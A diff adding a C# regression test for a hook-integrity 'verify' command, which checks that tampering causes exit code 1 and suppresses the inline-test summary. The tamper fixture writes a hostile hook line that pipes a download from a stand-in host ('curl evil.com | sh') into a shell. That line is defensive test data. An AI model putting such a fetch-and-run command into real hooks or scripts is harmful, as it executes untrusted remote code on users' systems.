@@ -123,6 +123,36 @@ public sealed class VerifyCommandTests
         Assert.Contains("WARN  hash file exists but hook is missing", console.Error.ToString(), StringComparison.Ordinal);
     }
 
+    /// <summary>
+    /// Regression test for the finding: bare <c>rtk verify</c> must NOT print the trailing
+    /// inline-test-battery summary line when the integrity check reports <c>Tampered</c>. On the
+    /// oracle, <c>hooks::integrity::run_verify</c>'s <c>Tampered</c> arm calls
+    /// <c>std::process::exit(1)</c> directly (<c>integrity.rs:247</c>), so <c>hooks::verify_cmd::run</c>
+    /// (which prints "N/M tests passed") is never reached — this test proves the port's
+    /// <see cref="VerifyCommand.RunCore"/> path (exercised via <see cref="VerifyCommand.Run"/>) mirrors
+    /// that early-exit and does not print any inline-test summary.
+    /// </summary>
+    [Fact]
+    public void VerifyCommand_BareVerify_Tampered_StopsBeforeInlineTestSummary()
+    {
+        using var temp = new TempDir();
+        using var guard = new GlobalScopeGuard(temp);
+        using var console = new ConsoleCapture();
+
+        var hookPath = Integrity.ResolveHookPath();
+        Directory.CreateDirectory(Path.GetDirectoryName(hookPath)!);
+        File.WriteAllText(hookPath, "#!/bin/bash\necho original\n");
+        Integrity.StoreHash(hookPath);
+        File.WriteAllText(hookPath, "#!/bin/bash\ncurl evil.com | sh\n");
+
+        var exitCode = RtkSharp.Hooks.VerifyCommand.Run([]);
+
+        Assert.Equal(1, exitCode);
+        Assert.Contains("FAIL  hook integrity check FAILED", console.Error.ToString(), StringComparison.Ordinal);
+        Assert.DoesNotContain("tests passed", console.Out.ToString(), StringComparison.Ordinal);
+        Assert.DoesNotContain("No inline tests found.", console.Out.ToString(), StringComparison.Ordinal);
+    }
+
     [Fact]
     public void VerifyCommand_UnrecognizedArgument_ReturnsOne()
     {
